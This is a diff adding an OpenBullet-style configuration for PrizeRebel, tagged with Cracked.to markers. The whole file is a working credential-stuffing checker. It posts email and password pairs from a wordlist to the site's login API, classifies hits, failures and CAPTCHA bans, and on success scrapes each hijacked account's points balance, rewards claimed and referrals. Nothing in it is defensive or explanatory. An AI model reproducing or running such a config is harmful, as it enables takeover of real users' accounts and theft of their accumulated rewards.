@@ -1,0 +1,60 @@
+[SETTINGS]
+{
+  "Name": "PrizeRebel",
+  "SuggestedBots": 1,
+  "LastModified": "2019-02-28T20:32:07.933864+01:00",
+  "AdditionalInfo": "",
+  "Author": "",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#Cracked.to REQUEST GET "https://www.prizerebel.com/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#Cracked.to PARSE "<SOURCE>" LR "name=\"uuid\" value=\"" "\"" Recursive=FALSE -> VAR "TOKEN" "" "" 
+#Cracked.to REQUEST POST "https://www.prizerebel.com/api/login.php" AutoRedirect=TRUE 
+  CONTENT "action=login&fbToken=&fbID=&signed_request=&uuid=<TOKEN>&email=<USER>&password=<PASS>&remember=1" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "origin: https://www.prizerebel.com" 
+  HEADER "referer: https://www.prizerebel.com/" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+#Cracked.to KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Your email or password is incorrect. If you forgot your password" 
+  KEYCHAIN Success OR 
+    KEY "{\"response\":\"success" 
+  KEYCHAIN Ban OR 
+    KEY "show_captcha\":true" 
+    KEY "Incorrect reCAPTCHA Response" 
+#Cracked.to REQUEST GET "https://www.prizerebel.com/members_edit.php" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#Cracked.to PARSE "<SOURCE>" LR "<li><h3>Current Points Balance</h3><span class=\"orange\">" "<" Recursive=FALSE -> CAP "Current Points Balance" "" "" 
+#Cracked.to PARSE "<SOURCE>" LR "<li><h3>Lifetime Points</h3><span class=\"orange\">" "<" Recursive=FALSE -> CAP "Lifetime Points" "" "" 
+#Cracked.to PARSE "<SOURCE>" LR "<li><h3>Rewards Claimed</h3><span class=\"orange\">" "<" Recursive=FALSE -> CAP "Rewards Claimed" "" "" 
+#Cracked.to PARSE "<SOURCE>" LR "<li><h3>Total Referrals</h3><span class=\"orange\">" "<" Recursive=FALSE -> CAP "Total Referrals" "" "" 
+#Cracked.to PARSE "<SOURCE>" LR "<li><h3>Today's Referral Points</h3><span class=\"orange\">" "<" Recursive=FALSE -> CAP "Today's Referral Points" "" "" 
